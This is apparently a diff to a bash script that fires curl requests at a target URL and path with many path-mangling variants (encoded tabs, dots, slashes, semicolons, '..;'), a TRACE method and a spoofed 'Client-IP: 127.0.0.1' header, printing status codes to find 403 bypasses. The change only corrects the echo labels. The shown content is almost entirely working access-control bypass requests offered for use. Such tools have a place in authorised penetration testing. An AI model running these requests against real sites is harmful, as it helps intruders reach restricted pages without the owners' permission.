@@ -52,27 +52,27 @@ echo "  --> ${1}/${2};/"
 curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $1/$2
 echo "  --> ${1}/${2} -X TRACE"
 curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/%09
-echo "  --> ${1}/%09"
+echo "  --> ${1}/${2}/%09"
 curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/%20
-echo "  --> ${1}/%20"
+echo "  --> ${1}/${2}/%20"
 curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/%23
-echo "  --> ${1}/%23"
+echo "  --> ${1}/${2}/%23"
 curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/%2e
-echo "  --> ${1}/%2e"
+echo "  --> ${1}/${2}/%2e"
 curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/%2f
-echo "  --> ${1}/%2f"
+echo "  --> ${1}/${2}/%2f"
 curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/.
-echo "  --> ${1}/."
+echo "  --> ${1}/${2}/."
 curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2/..;"
-echo "  --> ${1}/..;"
+echo "  --> ${1}/${2}/..;"
 curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2/;09"
-echo "  --> ${1}/;09"
+echo "  --> ${1}/${2}/;09"
 curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2/;09.."
-echo "  --> ${1}/;09.."
+echo "  --> ${1}/${2}/;09.."
 curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2/;%09..;"
-echo "  --> ${1}/;09..;"
+echo "  --> ${1}/${2}/;09..;"
 curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2/;%2f.."
-echo "  --> ${1}/;%2f.."
+echo "  --> ${1}/${2}/;%2f.."
 curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2/*"
 echo "  --> ${1}/${2}/*"
 curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Client-IP 127.0.0.1" $1/$2
